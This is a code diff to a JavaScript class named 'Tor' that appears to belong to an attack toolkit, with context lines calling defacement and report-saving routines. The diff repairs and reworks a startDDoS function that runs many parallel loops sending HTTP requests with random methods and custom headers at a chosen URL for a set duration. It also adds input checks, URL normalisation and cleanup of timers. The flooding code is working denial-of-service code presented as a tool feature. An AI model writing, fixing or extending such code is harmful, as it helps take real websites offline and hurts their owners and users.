@@ -130,6 +130,8 @@ class Tor {
         this.ddosAttackEndTime = null;
           // Tor gateway monitoring interval (1 minute)
           this.gatewayCheckInterval = 60000;
+              this.ddosAttackInterval = null;
+          this.timerInterval = null;
     }
     // Noodles Initialization and Global Consent
     async initializeNoodles() {
@@ -144,7 +146,9 @@ class Tor {
             this.setupDefacement();
             this.startAutoReportSaving();
             // Initialize TorGateways
-            this.initializeTorGateways();
+              if (!this.torGateways) {
+                this.initializeTorGateways();
+            }
             // New code for managing Tor gateways
             this.torGateways = new TorGateways(this);
         } else {
@@ -321,36 +325,42 @@ class Tor {
         this.logToConsole("DDoS setup complete.");
     }
     async startDDoS(url) {
-        this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
-        // Record start time
-        this.ddosAttackStartTime = new Date();
-        this.ddosThreads = [];
-        const endTime = Date.now() + (this.ddosConfig.duration * 1000);
-        let requestCount = 0;
-        const attackThread = async () => {
-            while (Date.now() < endTime) {
-                try {
-                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)]);
-                    const response = await this.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });
-                    if (!response.ok) {
-                        this.log(`Request failed with status: ${response.status}`, 'warn');
-                    }
-                    requestCount++;
-                } catch (error) {
-                    this.log(`Request error: ${error}`, 'error');
-                }
-                await this.delay(this.ddosConfig.requestDelay);
+            if (!url) {
+                alert("Please enter a valid URL for the DDoS attack.");
+                return;
             }
-        };
-        for (let i = 0; i < this.ddosConfig.threads; i++) {
-            this.ddosThreads.push(attackThread());
-        }
-        await Promise.all(this.ddosThreads);
-        // Record end time
-        this.ddosAttackEndTime = new Date();
-        this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
-        this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
-        this.displayDDoSTimer();  // Display timer after the attack is complete
+            this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
+            // Record start time
+            this.ddosAttackStartTime = new Date();
+            let requestCount = 0;
+            let endTime = Date.now() + (this.ddosConfig.duration * 1000);
+            const attackThread = async () => {
+                while (Date.now() < endTime) {
+                    try {
+                        const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)];
+                        const response = await this.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });
+                        if (!response.ok) {
+                            this.log(`Request failed with status: ${response.status}`, 'warn');
+                        }
+                        requestCount++;
+                    } catch (error) {
+                        this.log(`Request error: ${error}`, 'error');
+                    }
+                    await this.delay(this.ddosConfig.requestDelay);
+                }
+            };
+            // Initialize and start threads
+            this.ddosThreads = [];
+            for (let i = 0; i < this.ddosConfig.threads; i++) {
+                this.ddosThreads.push(attackThread());
+            }
+            // Wait for all threads to complete
+            await Promise.all(this.ddosThreads);
+            // Record end time
+            this.ddosAttackEndTime = new Date();
+            this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
+            this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
+            this.displayDDoSTimer();  // Display timer after the attack is complete
     }
     // Function to display the DDoS timer
     displayDDoSTimer() {
@@ -363,10 +373,18 @@ class Tor {
         }
     }
     stopDDoS() {
-        this.stopAttack();
+       this.stopAttack();
         // Clear the start and end times
         this.ddosAttackStartTime = null;
         this.ddosAttackEndTime = null;
+        if (this.ddosAttackInterval) {
+            clearInterval(this.ddosAttackInterval);
+            this.ddosAttackInterval = null;
+        }
+        if (this.timerInterval) {
+            clearInterval(this.timerInterval);
+            this.timerInterval = null;
+        }
     }
     delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
@@ -572,7 +590,10 @@ class Tor {
     }
     // Utilities
     rawFetch(url, options = {}) {
-        return fetch(url, options);
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'http://' + url;
+            }
+             return fetch(url, options);
     }
     startAttack(attackType, targetURL, config = {}) {
         this.activeAttackType = attackType;
